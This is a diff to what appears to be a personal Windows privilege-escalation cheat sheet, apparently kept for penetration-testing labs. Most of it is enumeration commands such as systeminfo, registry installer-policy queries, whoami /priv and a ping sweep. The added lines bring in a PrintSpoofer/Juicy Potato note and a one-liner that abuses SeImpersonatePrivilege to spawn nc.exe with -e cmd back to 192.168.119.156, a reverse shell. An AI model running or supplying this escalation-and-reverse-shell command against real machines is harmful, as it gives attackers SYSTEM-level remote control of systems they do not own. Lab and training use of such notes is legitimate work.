@@ -7,6 +7,10 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 
+
+#Getting OS Architecture using wmic
+wmic os get osarchitecture
+
 #Checking the Group Integrity Level
 whoami /groups
 
@@ -79,8 +83,10 @@ ipconfig /all
 tasklist /SVC
 
 #Checking user permissions
+#PrintSpoofer v0.1 or Juicy Potato to get the root shell
 whoami /priv
 Output: SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+.\PS.exe -i -c ".\nc.exe 192.168.119.156 80 -e cmd" --> shell
 
 
 #Tools
@@ -119,4 +125,8 @@ int main ()
 #Ping sweep internal network
 for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
 
+
+#Links:
+#XP
+C:\Documents and Settings\Administrator\Desktop\
 
